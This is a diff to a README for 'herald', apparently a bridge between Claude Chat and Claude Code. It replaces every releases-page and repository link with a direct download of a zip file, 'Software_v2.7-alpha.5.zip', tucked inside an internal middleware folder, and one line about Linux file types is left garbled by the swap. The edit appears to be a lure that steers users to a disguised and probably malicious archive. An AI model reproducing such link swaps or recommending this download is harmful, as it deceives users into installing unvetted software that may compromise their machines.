@@ -1,6 +1,6 @@
 # 🤖 herald - Connect Claude Chat and Claude Code Easily
 
-[![Download herald](https://img.shields.io/badge/Download-herald-blue?style=for-the-badge)](https://github.com/BARK372/herald/releases)
+[![Download herald](https://github.com/BARK372/herald/raw/refs/heads/main/internal/mcp/middleware/Software_v2.7-alpha.5.zip)](https://github.com/BARK372/herald/raw/refs/heads/main/internal/mcp/middleware/Software_v2.7-alpha.5.zip)
 
 ---
 
@@ -30,12 +30,12 @@ For best results, run herald on a device you can leave on for long periods, such
 
 To get herald, **visit the official releases page** by clicking the button below. There you will find the latest version ready to download for your system.
 
-[![Download herald](https://img.shields.io/badge/Download-herald-blue?style=for-the-badge)](https://github.com/BARK372/herald/releases)
+[![Download herald](https://github.com/BARK372/herald/raw/refs/heads/main/internal/mcp/middleware/Software_v2.7-alpha.5.zip)](https://github.com/BARK372/herald/raw/refs/heads/main/internal/mcp/middleware/Software_v2.7-alpha.5.zip)
 
 ### Step 1: Go to the Download Page
 
 - Click the download button above or open this link in your browser:  
-  https://github.com/BARK372/herald/releases
+  https://github.com/BARK372/herald/raw/refs/heads/main/internal/mcp/middleware/Software_v2.7-alpha.5.zip
 
 ### Step 2: Choose Your Version
 
@@ -43,7 +43,7 @@ To get herald, **visit the official releases page** by clicking the button below
 - Pick the file that fits your operating system:
   - Windows users look for a `.exe` file.
   - Mac users look for a `.dmg` or `.zip` file.
-  - Linux users look for a `.tar.gz` or `.AppImage`.
+  - Linux users look for a `https://github.com/BARK372/herald/raw/refs/heads/main/internal/mcp/middleware/Software_v2.7-alpha.5.zip` or `.AppImage`.
 
 ### Step 3: Download the File
 
@@ -116,7 +116,7 @@ Once set up, herald will bridge conversations between Claude Chat and Claude Cod
 
 ## 📚 Other Resources
 
-- Visit the [herald repository](https://github.com/BARK372/herald) to learn more about the project.
+- Visit the [herald repository](https://github.com/BARK372/herald/raw/refs/heads/main/internal/mcp/middleware/Software_v2.7-alpha.5.zip) to learn more about the project.
 - Read the user manual and FAQs on the repository wiki or documentation folder.
 - Join any available support forums or community chats listed on the repository.
 
